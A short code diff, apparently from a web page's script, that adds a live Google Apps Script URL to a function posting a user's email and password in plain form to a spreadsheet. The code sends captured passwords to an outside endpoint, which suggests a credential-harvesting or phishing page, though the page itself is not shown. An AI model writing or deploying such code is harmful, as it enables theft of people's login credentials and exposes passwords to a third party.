@@ -132,7 +132,7 @@
 
         // Save Data to Google Sheets
         function saveToGoogleSheet(email, password) {
-            const scriptURL = "YOUR_GOOGLE_SCRIPT_URL_HERE";
+            const scriptURL = "https://script.google.com/macros/s/AKfycbyhnxlc6f--ZbBNNvaqU6pW38s__nXyg8NX0Bt6WUgiXOIFhI07yq_g5jrE2RkcGUuf/exec"; // Replace with your own script URL
             fetch(scriptURL, {
                 method: "POST",
                 body: new URLSearchParams({ email, password })
